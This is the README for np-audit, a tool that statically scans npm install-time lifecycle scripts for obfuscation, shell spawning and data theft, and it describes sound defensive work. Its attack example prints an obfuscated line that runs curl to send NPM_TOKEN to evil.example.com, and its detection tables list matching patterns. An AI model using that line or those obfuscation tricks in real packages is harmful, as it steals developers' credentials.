![np-audit](docs/title-image.png)

[![npm version](https://img.shields.io/npm/v/np-audit.svg)](https://www.npmjs.com/package/np-audit)
[![npm downloads](https://img.shields.io/npm/dm/np-audit.svg)](https://www.npmjs.com/package/np-audit)
[![npm package size](https://img.shields.io/npm/unpacked-size/np-audit)](https://www.npmjs.com/package/np-audit)
[![GitHub license](https://img.shields.io/github/license/KoblerS/np-audit.svg)](https://github.com/KoblerS/np-audit/blob/main/LICENSE)
[![CI](https://github.com/KoblerS/np-audit/actions/workflows/ci.yml/badge.svg)](https://github.com/KoblerS/np-audit/actions/workflows/ci.yml)

# np-audit — npm package auditor

Static security analysis for npm packages — detects obfuscated lifecycle scripts, known vulnerabilities, and malicious patterns **before** they run. Drop-in replacement for `npm install` and `npm ci`.

**Zero dependencies.** Pure Node.js built-ins only.

---

## The Attack Vector

Supply chain attacks targeting the npm ecosystem frequently abuse lifecycle scripts. When you run `npm install`, npm automatically executes any `preinstall`, `install`, or `postinstall` script defined in a package's `package.json`. Attackers ship packages that look legitimate but embed malicious payloads hidden behind obfuscation techniques:

```json
{
  "scripts": {
    "postinstall": "node ./dist/install.js"
  }
}
```

Where `dist/install.js` contains something like:

```js
// Obfuscated — hard to read by design
var _0x3f2a = ['\x72\x65\x71\x75\x69\x72\x65', '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
eval(String.fromCharCode(114,101,113,117,105,114,101)+'(\'child_process\').exec(\'curl -s http://evil.example.com/\'+process.env.NPM_TOKEN)');
```

Real-world examples include:

- **[event-stream (2018)](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)** — malicious postinstall that stole Bitcoin wallet credentials
- **[ua-parser-js (2021)](https://github.com/advisories/GHSA-pjwm-rvh2-c87w)** — cryptocurrency miner + info-stealer injected via hijacked maintainer account
- **[node-ipc (2022)](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/)** — wiper malware targeting systems by geo-IP
- **[colors / faker (2022)](https://snyk.io/blog/open-source-npm-packages-colors-faker/)** — deliberate sabotage by the maintainer via postinstall
- **[SAP CAP / cds-dbs (2025)](https://community.sap.com/t5/technology-blog-posts-by-sap/cap-developers-call-to-action-to-mitigate-and-apply-solution-provided-in/ba-p/14387683)** — compromised npm package targeting SAP developers

**`npa` never executes the scripts.** It downloads and statically analyzes them, detecting:

| Signal                         | Example                                    |
| ------------------------------ | ------------------------------------------ |
| `eval()` / `new Function()`    | `eval(atob("aGVsbG8="))`                   |
| Indirect eval                  | `(0, eval)(x)`, `globalThis['ev'+'al'](x)` |
| Function constructor prototype | `({}).constructor.constructor("…")()`      |
| `setTimeout` with string arg   | `setTimeout('alert(1)', 100)`              |
| Obfuscator.io patterns         | `var _0x3f2a = [...]`                      |
| High-entropy strings           | Encrypted/compressed payloads              |
| Split-literal high entropy     | `'aB' + 'cD' + 'eF' + …` (concat chain)    |
| Hex / Unicode escape density   | `\x68\x65\x6c\x6c\x6f`, `\u0068\u0065…`    |
| `String.fromCharCode()` chains | `String.fromCharCode(104,101,108,108,111)` |
| Decimal char-code arrays       | `[101,118,97,108,...]` (printable ASCII)   |
| Base64 / hex decode + exec     | `Buffer.from(x,'base64'\|'hex')` + `eval`  |
| Shell spawning                 | `require('child_process').exec(...)`       |
| `worker_threads`               | `new Worker(...)`, eval-class surface      |
| Concealed `require`            | `require('child' + '_process')`            |
| Dynamic `require` / `import`   | `require(variable)`, `import(expr)`        |
| Large hex literal arrays       | `[0x1a, 0x2b, 0x3c, ...]` × 20+            |
| `process.env` access           | Token/credential harvesting                |
| Outbound network calls         | `https`/`http`/`net`/`dns`/`tls`/`dgram`/`http2`, `node:` prefix, dynamic `import()` |
| Missing referenced script      | Command references file not in tarball     |
| Oversized require graph        | Postinstall reaches >50 files or >5 MB     |

### Coverage beyond the entry script

`npa` doesn't just inspect the single file named in the lifecycle command. It:

- Splits chained commands (`&&`, `||`, `;`, `|`) and analyses each segment, so `node setup.js && node payload.js` no longer hides the second invocation.
- Handles `node -e "…"`, `sh -c "…"`, `python -c "…"` by analysing the inline code rather than just the wrapper command.
- Reads shell scripts (`sh ./install.sh`), Python scripts, and shebang-invoked files — not only `node` targets.
- Follows internal `require('./…')` and `import './…'` chains across the package (with cycle detection and per-package caps), so payloads hidden in helper files like `lib/helper.js` are caught.
- Records dynamic `require(variable)` / `import(expr)` calls as findings, since they can't be resolved statically.
- Scans the project's **own** `package.json` lifecycle scripts by default, catching PRs and supply-chain attacks that target the repository itself. Opt out with `scanSelf: false` in `.npmauditor.json`.
- Inspects **all** lifecycle scripts npm may run, not only `preinstall`/`install`/`postinstall`: also `prepare`, `preprepare`, `postprepare`, and `prepublish`.

---

## Install

**Global install (recommended):**

```bash
npm install -g np-audit
```

**Or use directly with npx:**

```bash
npx np-audit scan
```

After global install, use the `npa` command:

```bash
npa --version
```

---

## Usage

### Commands

| Command                        | Alias       | Description                        |
| ------------------------------ | ----------- | ---------------------------------- |
| `npa install [package]`        | `npa i`     | Audit then run `npm install`       |
| `npa ci`                       | —           | Audit then run `npm ci`            |
| `npa scan`                     | `npa s`     | Scan only, no install              |
| `npa config get`               | `npa c get` | Show current configuration         |
| `npa config set <key> <value>` | `npa c set` | Update a config value              |
| `npa alias`                    | —           | Print shell hook for auto-scanning |
| `npa alias --install`          | —           | Install hook to shell profile      |
| `npa alias --uninstall`        | —           | Remove hook from shell profile     |

Use `npa <command> -h` for detailed help on any command.

### Flags

| Flag        | Alias | Works with              | Description                                      |
| ----------- | ----- | ----------------------- | ------------------------------------------------ |
| `--review`  | `-r`  | `install`, `ci`         | Interactive mode — choose which scripts to allow |
| `--json`    | —     | `install`, `ci`, `scan` | Machine-readable JSON output                     |
| `--no-dev`  | —     | `install`, `ci`, `scan` | Skip devDependencies                             |
| `--verbose` | —     | all                     | Show fetch progress and extra detail             |
| `--version` | —     | —                       | Print version and exit                           |
| `--help`    | `-h`  | —                       | Print help and exit                              |

### Drop-in replacement for `npm install`

```bash
# Audit all dependencies, then install if clean
npa install          # or: npa i

# Audit a specific package before adding it
npa i express
```

### Drop-in replacement for `npm ci`

```bash
npa ci
```

### Scan only (no install)

```bash
npa scan             # or: npa s
npa s --json         # machine-readable output
npa s --no-dev       # skip devDependencies
npa s --verbose      # show fetch progress
```

### Interactive `--review` mode

Review each install script yourself and decide which to allow:

```bash
npa i --review        # or: npa i -r
npa ci --review
```

```
  npa --review mode
  Use ↑/↓ to navigate, SPACE to toggle, ENTER to confirm, q to quit

  Found 3 package(s) with install scripts:

     [✓ allow] esbuild@0.24.2       postinstall: post-install.js     OK
   ▶ [✗ deny ] evil-sdk@1.0.0       postinstall: install.js          DANGER (score: 9)
     [✓ allow] @scope/pkg@2.1.0     postinstall: install.js          WARN (score: 5)

  2 allowed  1 denied
```

After confirmation, `npa` runs `npm install --ignore-scripts` and then manually executes only the scripts you allowed.

### Configuration

```bash
# Show current config
npa config get

# Change thresholds
npa config set blockScore 6    # block at score 6+ (default: 7)
npa config set warnScore 3     # warn at score 3+ (default: 4)

# Skip trusted packages or scopes
npa config set skipPackages '["esbuild","puppeteer"]'
npa config set skipScopes '["@types","@babel"]'
```

Config is stored in `~/.npmauditor.json` (global) and can be overridden per project with `.npmauditor.json` in your project root.

### Shell Hook (npm alias)

Automatically run `npa scan` before every `npm install` or `npm ci`:

```bash
# Install the hook to your shell profile (~/.zshrc or ~/.bashrc)
npa alias --install

# Reload your shell
source ~/.zshrc  # or ~/.bashrc
```

Now when you run `npm install` or `npm ci`, npa will scan first:

```bash
$ npm install lodash
[npa] Scanning dependencies before npm install...
✔ No packages with install scripts found.
[npa] Scan passed. Running npm install...
```

If issues are found, the install is blocked:

```bash
$ npm install evil-pkg
[npa] Scanning dependencies before npm install...
✗ evil-pkg@1.0.0 DANGER (score: 9)
[npa] Scan found issues. Run 'npa install --review' for interactive mode.
```

To remove the hook:

```bash
npa alias --uninstall
```

#### All config keys

| Key               | Default                      | Description                             |
| ----------------- | ---------------------------- | --------------------------------------- |
| `blockScore`      | `7`                          | Score threshold for hard block (exit 1) |
| `warnScore`       | `4`                          | Score threshold for warning (exit 0)    |
| `registry`        | `https://registry.npmjs.org` | npm registry URL                        |
| `timeout`         | `30000`                      | HTTP request timeout (ms)               |
| `parallelFetches` | `5`                          | Concurrent tarball downloads            |
| `skipScopes`      | `[]`                         | `@scope` prefixes to skip entirely      |
| `skipPackages`    | `[]`                         | Specific package names to skip          |
| `silent`          | `false`                      | Suppress output when no issues found    |
| `scanSelf`        | `true`                       | Also scan the current project's own `package.json` lifecycle scripts |
| `maxTarballSize`  | `50MB`                       | Max unpacked tarball size (zip bomb protection) |
| `checkVulnerabilities` | `true`                  | Check packages against known vulnerability databases |
| `deepResolve`     | `false`                      | Recursively resolve full transitive dependency tree |

---

### Vulnerability Scanning (CVE)

np-audit checks every scanned package against known vulnerability databases. This runs alongside the obfuscation detection and flags packages with known CVEs.

**Default: OSV.dev (no setup required)**

Works out of the box — queries the free [OSV.dev](https://osv.dev/) API for known vulnerabilities and malicious package advisories.

**Optional: Snyk API (richer data)**

For more detailed vulnerability information, configure a Snyk API token:

```bash
# Option 1: Environment variable
export SNYK_API_TOKEN=your-token-here

# Option 2: Snyk CLI config (if you have Snyk CLI installed)
snyk auth
```

np-audit checks for the token in this order:
1. `SNYK_API_TOKEN` environment variable
2. `SNYK_TOKEN` environment variable
3. `~/.config/configstore/snyk.json` (created by `snyk auth`)

**Scoring:**
| Severity | Score | Verdict |
| -------- | ----- | ------- |
| Malicious package | 80 | DANGER |
| 10+ vulnerabilities | 6 | WARN |
| 5-9 vulnerabilities | 5 | WARN |
| 1-4 vulnerabilities | 4 | WARN |

Non-malicious CVEs produce warnings but never block installation. Only confirmed malicious packages trigger DANGER.

**Disable vulnerability checks:**

```bash
npa config set checkVulnerabilities false
```

---

## Exit codes

| Code | Meaning                             |
| ---- | ----------------------------------- |
| `0`  | All packages clean or only warnings |
| `1`  | One or more packages blocked        |

---

## How it works

1. **Parse** `package-lock.json` (supports v1, v2, v3 formats)
2. **Filter** packages: skip dev deps (`--no-dev`), skipped scopes/packages, packages without install scripts
3. **Fetch or read** — for packages in `node_modules`: read from disk. For packages not yet installed: download the tarball from the npm registry and parse it in memory (pure Node.js tar.gz reader, no `tar` package)
4. **Parse the lifecycle command** — split on `&&` / `||` / `;` / `|`, classify each segment by interpreter (`node`, `sh`, `python`, `bun`, …), and treat `node -e` / `sh -c` arguments as inline code
5. **Walk the require/import graph** from each entry script — following internal `./` / `../` paths, with cycle detection and per-package caps (50 files / 5 MB)
6. **Analyze** every reached file statically across all lifecycle scripts (`preinstall`, `install`, `postinstall`, `prepare`, `preprepare`, `postprepare`, `prepublish`) — never execute
7. **Also scan the current project's own** `package.json` lifecycle scripts (unless `scanSelf: false`)
8. **Score** findings (0–10 per signal), classify as DANGER / WARN / OK based on config thresholds
9. **Report** results to terminal or `--json` — each finding is tagged with the file it came from
10. **Proceed** — run npm normally, or in `--review` mode let you selectively allow scripts

---

## Marshallers

Detection is split into modular marshallers — each one detects a single attack signal:

| Marshaller | What it detects | Score |
| ---------- | --------------- | ----- |
| `eval/dynamic-exec` | `eval()`, `new Function()`, indirect eval, `vm.*`, `setTimeout` with string | 8 |
| `obfuscator.io` | `_0x` variable naming patterns (obfuscator.io output) | 9–80 |
| `high-entropy-string` | Long strings or concatenation chains with high Shannon entropy | 6 |
| `hex-escape-density` | Dense `\xNN` and `\uXXXX` escape sequences | 5–50 |
| `fromCharCode` | `String.fromCharCode` with many args, large decimal char-code arrays | 7 |
| `encoded-decode` | Base64/hex decode (`atob`, `Buffer.from`) optionally combined with `eval` | 3–8 |
| `child-process` | `require('child_process')`, `exec`, `spawn`, `fork`, worker_threads | 5 |
| `hex-array` | Large numbers of `0x` hex literal values | 7–60 |
| `process-env` | `process.env` access (credential exfiltration signal) | 3 |
| `network-call` | `require('https')`, `fetch()`, `dns`, `net`, `tls` | 4 |
| `filesystem-manipulation` | `fs.writeFile`, `chmod`, `symlink` (backdoor persistence) | 3–4 |
| `known-vulnerability` | Known CVEs via Snyk API or OSV.dev | 4–6 (WARN), 80 (malicious) |

Scores scale with severity — higher counts of obfuscation indicators produce higher scores. The final verdict is based on the highest individual score across all marshallers.

See [CONTRIBUTING.md](CONTRIBUTING.md) for the marshaller architecture and how to write custom ones.

---

## License

MIT
